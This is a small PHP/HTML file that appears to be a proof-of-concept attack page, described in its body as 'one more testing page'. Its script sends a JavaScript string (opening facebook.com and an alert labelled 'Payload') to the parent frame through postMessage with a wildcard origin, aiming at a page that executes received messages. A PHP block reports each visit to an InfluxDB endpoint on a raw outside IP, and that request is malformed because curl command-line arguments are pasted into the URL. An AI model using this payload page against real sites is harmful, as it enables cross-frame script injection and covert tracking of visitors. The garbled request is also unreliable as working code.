<?php
    $ch = curl_init("http://89.155.117.228:8086/write?db=log_connects --data-binary 'cpu_load_short,host=server02 value=0.67");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_exec($ch);
    curl_close($ch);
?>

<html>
    <head></head>
    <body>
        Just one more testing page...
        <script>
            top.postMessage(
                JSON.stringify("open('https://facebook.com');alert('Payload');"),
                "*"              
            );
        </script>
    </body>
</html>